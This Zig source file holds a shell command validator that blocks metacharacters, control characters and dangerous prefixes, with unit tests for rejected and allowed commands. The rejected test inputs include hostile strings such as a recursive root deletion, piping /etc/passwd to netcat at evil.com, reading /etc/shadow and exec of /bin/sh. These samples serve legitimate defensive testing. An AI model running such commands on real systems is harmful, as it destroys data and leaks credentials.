//! Shell command validation tests — standalone to verify security.

const std = @import("std");

fn validateCommand(command: []const u8) ?[]const u8 {
    if (command.len == 0) return "empty";
    if (std.mem.indexOfScalar(u8, command, 0) != null) return "null byte";
    for (command) |c| { if (c < 0x20 and c != '\t') return "control char"; }
    if (std.mem.indexOfScalar(u8, command, '\n') != null or std.mem.indexOfScalar(u8, command, '\r') != null) return "newline";
    const meta = [_][]const u8{ "&&", "||", "|", ";", ">", "<", "$(", "`", "&>", ">&", "<>", "<<<", "<<", ">>" };
    for (meta) |mc| { if (std.mem.indexOf(u8, command, mc) != null) return "metachar"; }
    const prefixes = [_][]const u8{ "cd ", "export ", "source ", "eval ", "exec ", ". ", "alias ", "set ", "unset " };
    for (prefixes) |p| { if (std.mem.startsWith(u8, command, p)) return "dangerous prefix"; }
    const bare = [_][]const u8{ "cd", "eval", "exec", "source", "exit", "logout" };
    for (bare) |w| { if (std.mem.eql(u8, command, w)) return "bare dangerous"; }
    return null;
}

test "shell: empty" { try std.testing.expect(validateCommand("") != null); }
test "shell: null byte" { try std.testing.expect(validateCommand("echo\x00cat") != null); }
test "shell: newline" { try std.testing.expect(validateCommand("ls\nwhoami") != null); }
test "shell: CR" { try std.testing.expect(validateCommand("ls\rwhoami") != null); }
test "shell: &&" { try std.testing.expect(validateCommand("ls && rm -rf /") != null); }
test "shell: ||" { try std.testing.expect(validateCommand("cat /etc/passwd || echo fail") != null); }
test "shell: pipe" { try std.testing.expect(validateCommand("cat /etc/passwd | nc evil.com") != null); }
test "shell: redirect >" { try std.testing.expect(validateCommand("echo > /etc/hosts") != null); }
test "shell: redirect <" { try std.testing.expect(validateCommand("cat < /etc/shadow") != null); }
test "shell: subcmd $()" { try std.testing.expect(validateCommand("echo $(whoami)") != null); }
test "shell: subcmd backtick" { try std.testing.expect(validateCommand("echo `whoami`") != null); }
test "shell: cd prefix" { try std.testing.expect(validateCommand("cd /etc") != null); }
test "shell: eval prefix" { try std.testing.expect(validateCommand("eval ls") != null); }
test "shell: exec prefix" { try std.testing.expect(validateCommand("exec /bin/sh") != null); }
test "shell: bare cd" { try std.testing.expect(validateCommand("cd") != null); }
test "shell: bare eval" { try std.testing.expect(validateCommand("eval") != null); }
test "shell: heredoc" { try std.testing.expect(validateCommand("cat << EOF") != null); }
test "shell: append >>" { try std.testing.expect(validateCommand("echo >> /etc/hosts") != null); }
test "shell: safe ls" { try std.testing.expect(validateCommand("ls -la") == null); }
test "shell: safe grep" { try std.testing.expect(validateCommand("grep -r pattern .") == null); }
test "shell: safe find" { try std.testing.expect(validateCommand("find . -name '*.zig'") == null); }
test "shell: safe echo" { try std.testing.expect(validateCommand("echo hello world") == null); }
test "shell: safe python" { try std.testing.expect(validateCommand("python3 script.py --flag") == null); }
test "shell: safe cat" { try std.testing.expect(validateCommand("cat file.txt") == null); }
